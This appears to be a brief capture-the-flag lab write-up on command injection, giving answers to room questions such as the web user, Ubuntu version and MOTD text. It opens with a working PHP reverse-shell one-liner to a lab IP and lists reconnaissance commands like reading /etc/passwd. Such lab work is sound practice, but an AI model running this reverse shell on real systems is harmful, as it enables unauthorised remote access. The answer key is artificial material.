# [Severity 1] Command Injection Practical

```
php -r '$sock=fsockopen("10.9.18.129",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Questions
1. What strange text file is in the website root directory?
```
drpepper.txt
```

2. How many non-root/non-service/non-daemon users are there?
```
0
```

3. What user is this app running as?
```
www-data
```

4. What is the user's shell set as?
```
cat /etc/passwd
/usr/sbin/nologin
```

5. What version of Ubuntu is running?
```
lsb_release -a
18.04.4
```

6. Print out the MOTD.  What favorite beverage is shown?
```
find / -name 00-header
cat /etc/update-motd.d/00-header
DR PEPPER
```